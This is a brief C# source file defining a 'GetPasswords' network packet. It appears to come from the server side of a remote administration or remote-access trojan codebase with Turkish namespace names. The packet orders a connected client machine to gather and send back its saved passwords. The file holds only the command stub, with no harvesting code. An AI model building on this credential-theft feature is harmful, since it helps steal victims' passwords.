using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class GetPasswords : IPacket
    {
        public GetPasswords()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
